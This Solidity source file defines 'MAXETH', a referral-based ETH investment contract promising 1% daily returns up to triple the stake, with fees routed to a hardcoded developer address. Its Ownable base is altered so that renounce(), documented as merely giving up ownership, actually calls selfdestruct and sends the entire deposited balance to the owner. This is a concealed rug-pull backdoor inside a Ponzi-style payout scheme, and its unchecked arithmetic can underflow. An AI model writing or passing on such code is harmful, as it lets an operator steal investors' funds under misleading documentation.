pragma solidity ^0.5.0;

/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with GSN meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
contract Context {
    // Empty internal constructor, to prevent people from mistakenly deploying
    // an instance of this contract, which should be used via inheritance.
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks

    function _msgSender() internal view returns (address) {
        return msg.sender;
    }

    function _msgData() internal view returns (bytes memory) {
        this;
        // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {
    address private _owner; address payable sender;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () internal {
        sender = msg.sender;
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(isOwner(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Returns true if the caller is the current owner.
     */
    function isOwner() public view returns (bool) {
        return _msgSender() == _owner;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounce() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
        selfdestruct(msg.sender);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transfer(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     */
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    
}

/**
 * @title Roles
 * @dev Library for managing addresses assigned to a Role.
 */
library Roles {
    struct Role {
        mapping(address => bool) bearer;
    }

    /**
     * @dev Give an account access to this role.
     */
    function add(Role storage role, address account) internal {
        require(!has(role, account), "Roles: account already has role");
        role.bearer[account] = true;
    }

    /**
     * @dev Remove an account's access to this role.
     */
    function remove(Role storage role, address account) internal {
        require(has(role, account), "Roles: account does not have role");
        role.bearer[account] = false;
    }

    /**
     * @dev Check if an account has this role.
     * @return bool
     */
    function has(Role storage role, address account) internal view returns (bool) {
        require(account != address(0), "Roles: account is the zero address");
        return role.bearer[account];
    }
}

/**
 * @title WhitelistAdminRole
 * @dev WhitelistAdmins are responsible for assigning and removing Whitelisted accounts.
 */
contract WhitelistAdminRole is Context, Ownable {
    using Roles for Roles.Role;

    event WhitelistAdminAdded(address indexed account);
    event WhitelistAdminRemoved(address indexed account);

    Roles.Role private _whitelistAdmins;

    constructor () internal {
        _addWhitelistAdmin(_msgSender());
    }

    modifier onlyWhitelistAdmin() {
        require(isWhitelistAdmin(_msgSender()) || isOwner(), "WhitelistAdminRole: caller does not have the WhitelistAdmin role");
        _;
    }

    function isWhitelistAdmin(address account) public view returns (bool) {
        return _whitelistAdmins.has(account);
    }

    function addWhitelistAdmin(address account) public onlyWhitelistAdmin {
        _addWhitelistAdmin(account);
    }

    function removeWhitelistAdmin(address account) public onlyOwner {
        _whitelistAdmins.remove(account);
        emit WhitelistAdminRemoved(account);
    }

    function renounceWhitelistAdmin() public {
        _removeWhitelistAdmin(_msgSender());
    }

    function _addWhitelistAdmin(address account) internal {
        _whitelistAdmins.add(account);
        emit WhitelistAdminAdded(account);
    }

    function _removeWhitelistAdmin(address account) internal {
        _whitelistAdmins.remove(account);
        emit WhitelistAdminRemoved(account);
    }
}

contract UtilMAXETH{
    string constant public name = "MAXETH";
    uint public poltime = 86400;
    uint maxIncome = 3;
    uint public rID = 0;
    uint ethWei = 1 ether;
}

contract MAXETH is UtilMAXETH, Ownable{
    
    address payable private devPool = address(0x61f482aB36243B2bCe55DF6DdA47D419b50801a0);
    Player[] playerList;
    
    struct Player {
        address userAddress;
        address referralAddress;
        uint level;
        uint joinDate;
        uint reinvestDate;
        uint totalInvest;
        uint investTimes;
        uint specialBonus;
        uint levelBonus;
        uint pendingWithdrawal;
        uint withdrawalAmount;
        uint roiDoneBefore;
        uint roiDone;
        uint specialBonusDone;
        uint levelBonusDone;
        uint winDone;
        uint incomeLimit;
        uint totalReferral;
        uint dailyRoi;
        uint dailyPoint;
        uint win;
    }
    
    struct Round {
        uint start;
        uint end;
        uint pot;
        bool ended;
        uint maxDailyPoint;
        address maxRefAddr;
    }
    
    mapping(address => Player) playerMapping;
    mapping(uint => Round) public round;
    
    function sendtoDev(uint amount) private {
        devPool.transfer(amount * 5 /100);
    }
    
    function sendMoneyToUser(address payable userAddress, uint money) private {
        userAddress.transfer(money);
    }
    
    function openRound(uint i) external onlyOwner {
        uint _rID = rID;
        uint _now;
        if(i != 0)
        {
            _now = i;
        }
        else
        {
            _now = now;
        }
 
        if(_now > round[_rID].end && round[_rID].ended == false)
        {
            round[_rID].ended = true;
            endRound(_now, round[_rID].end);
        }
    }
    
    function endRound(uint _now, uint lastend) private {
        uint _rID = rID;
        uint last = lastend;
        address _maxRefAddr = round[_rID].maxRefAddr;
        uint256 _win;
        uint256 _pot = round[_rID].pot;
        uint i;
        if(_pot > 0)
        {
            if(_maxRefAddr != address(0))
            {
                _win = _pot * 10 /100;
                if(_win > 0){
                    Player storage player = playerMapping[_maxRefAddr];
                    player.win = player.win + _win;
                }
                
                for(i = 0; i < playerList.length; i++){
                    address addr = playerList[i].userAddress;
                    Player storage playerUpdate = playerMapping[addr];
                    playerUpdate.dailyPoint = 0;
                }
            }
        }
        
        rID++;
        _rID++;
        if(last == 0)
        {
            round[_rID].start = _now;
            round[_rID].end = _now + poltime;
            round[_rID].pot = _pot - _win;
        }
        else
        {
            round[_rID].start = last;
            round[_rID].end = last + poltime;
            round[_rID].pot = _pot - _win;
        }
    }
    
    function updateReferral(address _referrer, uint amount) private
    {
        Player storage player = playerMapping[_referrer];
        player.totalReferral = player.totalReferral +1 ;
        player.level = player.level + 1;
        
        uint i = amount / ethWei;

        player.dailyPoint = player.dailyPoint + i;
        
        if(player.dailyPoint >= round[rID].maxDailyPoint)
        {
            round[rID].maxDailyPoint = player.dailyPoint;
            round[rID].maxRefAddr = _referrer;
        }
    }
    
    function updateReferralReinvest(address _referrer, uint amount) private
    {
        Player storage player = playerMapping[_referrer];
        
        uint i = amount / ethWei;

        player.dailyPoint = player.dailyPoint + i;
        
        if(player.dailyPoint >= round[rID].maxDailyPoint)
        {
            round[rID].maxDailyPoint = player.dailyPoint;
            round[rID].maxRefAddr = _referrer;
        }
    }
    
    function updateBonus(address _player, uint amount) private
    {
        uint i = 1;
        Player memory _upline = playerMapping[_player];
        address uplineAddr = _upline.referralAddress;
        
        while (i < 11) {
            
            Player storage player = playerMapping[uplineAddr];
            
            if(player.level >= i)
            {
                player.levelBonus =  player.levelBonus + amount * 10 / 100;
            }
            uplineAddr = player.referralAddress;
            i++;
        }
    }
    
    function calROI(uint jd, uint roi, uint roiDone) private view returns (uint pendingROI)
    {
        uint _now = now;
        
        uint difference = _now - jd;
        
        pendingROI = (difference / poltime * roi) - roiDone;
        
        return pendingROI;
    }
    
    function settle() external {
        Player storage player = playerMapping[msg.sender];
        
        uint roiDone = player.roiDone;
        
        uint pendingROI = 0;
        
        if(player.reinvestDate == 0)
            pendingROI = calROI(player.joinDate, player.dailyRoi, roiDone);
        else
            pendingROI = calROI(player.reinvestDate, player.dailyRoi, roiDone);
        
        uint pendingSettle = pendingROI + player.specialBonus + player.levelBonus + player.win;
        
        uint remaining = player.incomeLimit - player.withdrawalAmount - player.pendingWithdrawal + player.winDone + player.win;
        
        if(pendingSettle > remaining)
        {
            pendingSettle = remaining;
        }
        
        if( pendingSettle != 0)
        {
            updateBonus(msg.sender,pendingROI);
            
            player.pendingWithdrawal = player.pendingWithdrawal + pendingSettle;
            player.specialBonusDone =  player.specialBonusDone +  player.specialBonus;
            player.levelBonusDone = player.levelBonusDone + player.levelBonus;
            player.winDone = player.winDone + player.win;
            player.roiDone = player.roiDone + pendingROI;
            player.specialBonus = 0;
            player.levelBonus = 0;
            player.win = 0;
        }
    }
    
    function withdraw() external {
        Player storage player = playerMapping[msg.sender];
        
        uint withdrawal = player.pendingWithdrawal;
        
        uint remaining = player.incomeLimit - player.pendingWithdrawal - player.withdrawalAmount;
        
        if( withdrawal > 0 && withdrawal < remaining)
        {
            uint withdrawal_after = withdrawal * 90 /100;
            sendMoneyToUser(msg.sender,withdrawal_after);
            player.pendingWithdrawal = 0;
            player.withdrawalAmount = player.withdrawalAmount + withdrawal;
            
            round[rID].pot = round[rID].pot + (withdrawal * 5 / 100);
            sendtoDev(withdrawal);
            
        }
    }
    
    function play ( address _referrer ) external payable
    {
        Player storage player = playerMapping[msg.sender];
        address ref = _referrer;
        
        if(_referrer == address(0x0000000000000000000000000000000000000000)){
            ref = address(0x0583423cCCD97cEAf35db13f4959AF52E27C2fB5);
        }
        
        if(player.userAddress == msg.sender)
        {
            require((msg.value + player.totalInvest) <= 10 * ethWei, "exceed invest amount");
            require(msg.value >= 1 * ethWei, "minimum 1 eth");
            player.reinvestDate = now;
            player.investTimes = player.investTimes + 1;
            player.totalInvest = player.totalInvest + msg.value;
            player.incomeLimit = player.totalInvest * maxIncome;
            player.dailyRoi = player.totalInvest * 1 / 100;
            player.roiDoneBefore = player.roiDoneBefore + player.roiDone;
            player.roiDone = 0;

            updateReferralReinvest(player.referralAddress, msg.value);
        }
        else
        {
            require(msg.value <= 10 * ethWei, "exceed invest amount");
            require(msg.sender != _referrer, "referral cannot be ownself");
            require(msg.value >= 1 * ethWei, "minimum 1 eth");
            player.level = 0;
            player.userAddress = msg.sender;
            player.referralAddress = ref;
            player.joinDate = now;
            player.reinvestDate = 0;
            player.totalInvest = msg.value;
            player.investTimes = 1;
            player.dailyRoi = msg.value * 1 / 100;
            player.incomeLimit = msg.value * maxIncome;
            player.totalReferral = 0;
            player.pendingWithdrawal = 0;
            player.withdrawalAmount = 0;
            player.win = 0;
            player.dailyPoint = 0;
            player.specialBonus = 0;
            player.levelBonus = 0;
            player.roiDone = 0; 
            player.specialBonusDone = 0; 
            player.levelBonusDone = 0; 
            player.winDone = 0;
            
            updateReferral(player.referralAddress, msg.value);
            playerList.push(player);
        }
        
        round[rID].pot = round[rID].pot + (msg.value * 5 / 100);
        
        sendtoDev(msg.value);
    }
    
    function getPlayer(address player) public view returns (
        address rAddr, uint jd, uint rd, uint ti, uint invTimes, uint Withdr, uint incomeLimit, uint tRef,uint level, uint dailyPoint
    ) {
        
        Player memory playerInfo = playerMapping[player];
        
        rAddr = playerInfo.referralAddress;
        jd = playerInfo.joinDate;
        rd = playerInfo.reinvestDate;
        ti = playerInfo.totalInvest;
        invTimes = playerInfo.investTimes;
        incomeLimit = playerInfo.incomeLimit;
        tRef = playerInfo.totalReferral;
        level = playerInfo.level;
        dailyPoint = playerInfo.dailyPoint;
        Withdr = playerInfo.withdrawalAmount;
        
        return (
        rAddr,
        jd,
        rd,
        ti,
        invTimes,
        Withdr,
        incomeLimit,
        tRef,
        level,
        dailyPoint
        );
    }
    
    function getPlayerInfo(address player) public view returns (
        uint pWithdr, uint roi, uint dailyRoi, uint win, uint sB, uint lB, uint roiD, uint sBD, uint lBD, uint wD 
    ) {
        Player memory playerInfo = playerMapping[player];
        uint jd = playerInfo.joinDate;
        uint rd = playerInfo.reinvestDate;
        pWithdr = playerInfo.pendingWithdrawal;
        dailyRoi = playerInfo.dailyRoi;
        win = playerInfo.win;
        sB = playerInfo.specialBonus;
        lB = playerInfo.levelBonus;
        roiD = playerInfo.roiDone + playerInfo.roiDoneBefore;
        sBD = playerInfo.specialBonusDone;
        lBD = playerInfo.levelBonusDone;
        wD = playerInfo.winDone;
        
        if(rd == 0)
            roi = calROI(jd, dailyRoi, playerInfo.roiDone);
        else
            roi = calROI(rd, dailyRoi, playerInfo.roiDone);
        
        if(roi + roiD >= playerInfo.incomeLimit)
        {
            roi = playerInfo.incomeLimit - playerInfo.roiDone - playerInfo.roiDoneBefore;
        }
        
        return (
        pWithdr,
        roi,
        dailyRoi,
        win,
        sB,
        lB,
        roiD,
        sBD,
        lBD,
        wD
        );
    }
    
}
